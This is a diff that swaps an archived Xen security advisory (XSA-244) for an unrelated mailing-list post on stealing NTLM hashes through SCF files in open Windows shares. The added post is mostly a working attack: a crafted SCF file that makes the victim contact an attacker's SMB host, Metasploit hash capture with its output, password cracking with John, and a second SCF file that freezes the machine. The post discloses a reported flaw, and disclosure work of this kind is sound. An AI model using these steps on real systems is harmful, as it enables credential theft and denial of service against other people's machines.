@@ -1,140 +1,182 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/10/18/8
-Message-Id: <E1e4n9P-0001S0-8f@xenbits.xenproject.org>
-Date: Wed, 18 Oct 2017 12:08:43 +0000
-From: Xen.org security team <security@....org>
-To: xen-announce@...ts.xen.org, xen-devel@...ts.xen.org, xen-users@...ts.xen.org, oss-security@...ts.openwall.com
-CC: Xen.org security team <security-team-members@....org>
-Subject: Xen Security Advisory 244 (CVE-2017-15594) - x86: Incorrect handling of IST settings during CPU hotplug
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/10/24/1
+Message-ID: <CAHzAkRGAjfBh6-GgW4-gotZGSBQ4=K+xUmYegbs+-X-k8-za5w@mail.gmail.com>
+Date: Mon, 23 Oct 2017 16:47:46 -0700
+From: Juan Diego <diego@...ux.com>
+To: fulldisclosure@...lists.org, oss-security@...ts.openwall.com,  bugtraq@...urityfocus.com
+Subject: Hash thief on Windows shared folder with SCF files. ADV170014 NTLM SSO
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA256
+Hello,
 
-            Xen Security Advisory CVE-2017-15594 / XSA-244
-                              version 3
+I want to share some information with the people on the list.
+On May 24, I found a problem with NTLM auth on Windows.
 
-      x86: Incorrect handling of IST settings during CPU hotplug
+Under certain circumstances a shared folder on Windows can be abused
+remotely to obtain the user credentials and to freeze the machine.
 
-UPDATES IN VERSION 3
-====================
+This was already reported to MSRC on May 24, and was closed on October 18.
 
-CVE assigned.
+This attack makes use of SCF files, and a shared folder with certain
+configuration.
 
-ISSUE DESCRIPTION
-=================
+-Create a folder anywhere on the system, example on the Desktop
+-Right click - Properties
+-Sharing tab
+-Network and Sharing center
+-Enable 'Turn off password protected sharing'
 
-The x86-64 architecture allows interrupts to be run on distinct stacks.
-The choice of stack is encoded in a field of the corresponding
-interrupt descriptor in the Interrupt Descriptor Table (IDT).  That
-field selects an entry from the active Task State Segment (TSS).
+Now, you need a crafted SCF file to abuse this, the file looks like this
 
-Since, on AMD hardware, Xen switches to an HVM guest's TSS before
-actually entering the guest, with the Global Interrupt Flag still set,
-the selectors in the IDT entry are switched when guest context is
-loaded/unloaded.
+root@...adminjd:~# cat test.scf
+[Shell]
+Command=2
+IconFile=\\192.168.1.111\share\test.ico
+[Taskbar]
+Command=ToggleDesktop
 
-When a new CPU is brought online, its IDT is copied from CPU0's IDT,
-including those selector fields.  If CPU0 happens at that moment to be
-in HVM context, wrong values for those IDT fields would be installed
-for the new CPU.  If the first guest vCPU to be run on that CPU
-belongs to a PV guest, it will then have the ability to escalate its
-privilege or crash the hypervisor.
+root@...adminjd:~#
 
-IMPACT
-======
+We are going to upload this file to the newly shared folder, we'll use
+smbclient, but first we need a metasploit console running capture/smb
+auxiliary module.
 
-A malicious or buggy x86 PV guest could escalate its privileges or
-crash the hypervisor.
+root@...adminjd:~# msfconsole -q
 
-VULNERABLE SYSTEMS
-==================
+msf > use auxiliary/server/capture/smb
+msf auxiliary(smb) > set JOHNPWFILE /tmp/smbhash.txt
+JOHNPWFILE = /tmp/smbhash.txt
+msf auxiliary(smb) > exploit -j
+[*] Auxiliary module running as background job
 
-All Xen versions from at least 3.2 onwards are vulnerable.  Earlier
-versions have not been checked.
+[*] Server started.
+msf auxiliary(smb)
 
-Only PV guests can exploit the vulnerability.  HVM guests cannot
-exploit the vulnerability, but their presence is necessary for the
-exposure of the vulnerability to PV guests.
 
-Only x86 systems using SVM (AMD virtualisation extensions) rather than
-VMX (Intel virtualisation extensions) are vulnerable.  Therefore AMD
-x86 hardware is vulnerable; Intel hardware is not vulnerable.
+Now we can upload the file
 
-ARM systems are not vulnerable.
+root@...adminjd:~# smbclient //192.168.1.67/Users
+WARNING: The "syslog" option is deprecated
+Enter root's password:
+OS=[Windows 7 Ultimate 7601 Service Pack 1] Server=[Windows 7 Ultimate 6.1]
+smb: \> cd juan
+smb: \juan\> cd Desktop\
+smb: \juan\Desktop\> cd prueba2\
+smb: \juan\Desktop\prueba2\> put test.scf
+putting file test.scf as \juan\Desktop\prueba2\test.scf (88.9 kb/s)
+(average 88.9 kb/s)
+smb: \juan\Desktop\prueba2\> ls
+. D 0 Mon Oct 23 12:27:15 2017
+.. D 0 Mon Oct 23 12:27:15 2017
+.DS_Store AH 6148 Tue May 23 17:29:03 2017
+test.scf A 91 Mon Oct 23 12:27:15 2017
 
-MITIGATION
-==========
+6527487 blocks of size 4096. 4043523 blocks available
+smb: \juan\Desktop\prueba2\>
+root@...adminjd:~#
 
-Avoiding to online CPUs at runtime will avoid this vulnerability.
+Our metasploit console should look like this
 
-Running only HVM or only PV guests on any individual host will also
-avoid this vulnerability.
+msf auxiliary(smb) >
+[*] SMB Captured - 2017-10-23 12:27:15 -0400
+NTLMv2 Response Captured from 192.168.1.67:49163 - 192.168.1.67
+USER:juan DOMAIN:juan-PC OS: LM:
+LMHASH:Disabled
+LM_CLIENT_CHALLENGE:Disabled
+NTHASH:47894338d99abe2f08e2c693618c7323
+NT_CLIENT_CHALLENGE:0101000000000000d0046aca1b4cd301d755c3756d5639d800000000020000000000000000000000
+[*] SMB Captured - 2017-10-23 12:27:15 -0400
+NTLMv2 Response Captured from 192.168.1.67:49163 - 192.168.1.67
+USER:juan DOMAIN:juan-PC OS: LM:
+LMHASH:Disabled
+LM_CLIENT_CHALLENGE:Disabled
+NTHASH:e97b70559f29462e2ca221d31113b9ca
+NT_CLIENT_CHALLENGE:0101000000000000a0177dca1b4cd301f59d5c5d52708e3b00000000020000000000000000000000
+[*] SMB Captured - 2017-10-23 12:27:15 -0400
+NTLMv2 Response Captured from 192.168.1.67:49163 - 192.168.1.67
+USER:juan DOMAIN:juan-PC OS: LM:
+LMHASH:Disabled
+LM_CLIENT_CHALLENGE:Disabled
+NTHASH:eb8b228b739cc95a12d7e0d89d89e002
+NT_CLIENT_CHALLENGE:0101000000000000620389ca1b4cd3017283fc96884767b700000000020000000000000000000000
+[*] SMB Captured - 2017-10-23 12:37:09 -0400
+NTLMv2 Response Captured from 192.168.1.67:49164 - 192.168.1.67
+USER:juan DOMAIN:juan-PC OS: LM:
+LMHASH:Disabled
+LM_CLIENT_CHALLENGE:Disabled
+NTHASH:4abb0803c4afd1509bfca3bbc566ad70
+NT_CLIENT_CHALLENGE:010100000000000076d7742c1d4cd30161b2c77a54bd58fe00000000020000000000000000000000
+[*] SMB Captured - 2017-10-23 12:37:09 -0400
+NTLMv2 Response Captured from 192.168.1.67:49164 - 192.168.1.67
+USER:juan DOMAIN:juan-PC OS: LM:
+LMHASH:Disabled
+LM_CLIENT_CHALLENGE:Disabled
+NTHASH:5eeb82aab85e9663624aaf6500e4d8f8
+NT_CLIENT_CHALLENGE:010100000000000046ea872c1d4cd301c7a724adf323918c00000000020000000000000000000000
 
-CREDITS
-=======
+I chopped this one to avoid sending too much to the list.
 
-This issue was discovered by Andrew Cooper of Citrix.
+When we started the smb capture module, we passed the option
 
-RESOLUTION
-==========
+msf auxiliary(smb) > set JOHNPWFILE /tmp/smbhash.txt
 
-Applying the appropriate attached patch resolves this issue.
+So our hashes are on /tmp/smbhash.txt
 
-xsa244.patch           xen-unstable, Xen 4.9.x, Xen 4.8.x
-xsa244-4.7.patch       Xen 4.7.x
-xsa244-4.6.patch       Xen 4.6.x
-xsa244-4.5.patch       Xen 4.5.x
+Let's try with John
 
-$ sha256sum xsa244*
-5b663620a1b0d5f07e7ae4d1d3506d925515d5f85830ca49dda75cab1218506f  xsa244.meta
-bcf22b332bf3f6fe8c86e4de67f82628c9b8e257d9513c3bf5c7f5dd71d86c33  xsa244.patch
-4c4543fdfd25b4a8ea7d53f3f45011ec137798e7d4e690d8f3ea58d77afb5f06  xsa244-4.5.patch
-eaa3ba303980d783813db7aee948a9cb2723328da5fa5650ffca7b825c21bab6  xsa244-4.6.patch
-4d8cf754f760ef05488e9fb25a7ebd9a7e46f3742e91eee1a8385fd1e611ea8c  xsa244-4.7.patch
-$
+root@...adminjd:~# cd /tmp/
+root@...adminjd:/tmp# john smbhash.txt_netntlmv2
+Using default input encoding: UTF-8
+Rules/masks using ISO-8859-1
+Loaded 6 password hashes with 6 different salts (netntlmv2, NTLMv2 C/R [MD4
+HMAC-MD5 32/64])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+abc (juan)
+abc (juan)
+abc (juan)
+abc (juan)
+abc (juan)
+abc (juan)
+6g 0:00:00:00 DONE 2/3 (2017-10-23 12:27) 75.86g/s 404596p/s 585124c/s
+585124C/s abc
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+root@...adminjd:/tmp#
 
-DEPLOYMENT DURING EMBARGO
-=========================
+That's it, now we have the plain text password for the machine.
 
-Deployment of the patches and/or mitigations described above (or
-others which are substantially similar) is permitted during the
-embargo, even on public-facing systems with untrusted guest users and
-administrators.
+If we want to freeze the machine, we can attack via $MFT with a SCF file
+like this
 
-But: Distribution of updated software is prohibited (except to other
-members of the predisclosure list).
+root@...adminjd:~# cat mft.scf
+[Shell]
+Command=2
+IconFile= c:\$MFT\123
+[Taskbar]
+Command=ToggleDesktop
+root@...adminjd:~#
 
-Predisclosure list members who wish to deploy significantly different
-patches and/or mitigations, please contact the Xen Project Security
-Team.
+Just upload it to the vulnerable folder, and the machine will freeze in a
+few minutes due to $MFT NTFS issue.
 
-(Note: this during-embargo deployment notice is retained in
-post-embargo publicly released Xen Project advisories, even though it
-is then no longer applicable.  This is to enable the community to have
-oversight of the Xen Project Security Team's decisionmaking.)
+Accordingly to MS, all Windows versions are affected, they released an
+advisory for this:
+https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/ADV170014#ID0EGB
 
-For more information about permissible uses of embargoed information,
-consult the Xen Project community's agreed Security Policy:
-  http://www.xenproject.org/security-policy.html
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1
+It's a partial patch, there are no real fix for this, and the regcode
+change proposed by MS is only for Windows 10 and Server 2016.
 
-iQEcBAEBCAAGBQJZ50QqAAoJEIP+FMlX6CvZmsEIAKuPA1/ly1Hgf9vZCkbKauO/
-df8JgVdLemcGSEfDwzVlRjHQh0QtpMLNG5RCYRD+s8hrCotKc8dC95+pIztDY/l+
-lw6k9bCFup7hI++IdL/fmy79RS+WUOinMEOwD39zqFVK+y6J2M0iXnuKqxtF+j/7
-zWVmzdZIHbM+6DlRr1uN0jpirqkJ8P5yNMBgqhp4zH4efOe0Olv+0SQtNtNclCib
-MR4ipBbkK9sCMN6odZCbnwKkn2zyCDSfPiXnINfiIbsUweCf9n6MEpry8Kiae90Z
-BFn+KGkRcC9gQkoKRoF/rDwG02P6KCb34pNY0nVgxtr4pDYqJzhEh7+eGXfVHME=
-=dk0t
------END PGP SIGNATURE-----
+I have a better-explained post about this on my blog
 
-Download attachment "xsa244.meta" of type "application/octet-stream" (2483 bytes)
+English: http://www.sysadminjd.com/adv170014-ntlm-sso-exploitation-guide/
+Spanish: https://www.sysadminjd.com/adv170014-ntlm-sso-guia-de-explotacion/
 
-Download attachment "xsa244.patch" of type "application/octet-stream" (2366 bytes)
+thanks for your time :)
 
-Download attachment "xsa244-4.5.patch" of type "application/octet-stream" (2069 bytes)
+Best Regards
 
-Download attachment "xsa244-4.6.patch" of type "application/octet-stream" (2072 bytes)
 
-Download attachment "xsa244-4.7.patch" of type "application/octet-stream" (2052 bytes)
+Juan Diego
+--------
+ᐧ
+
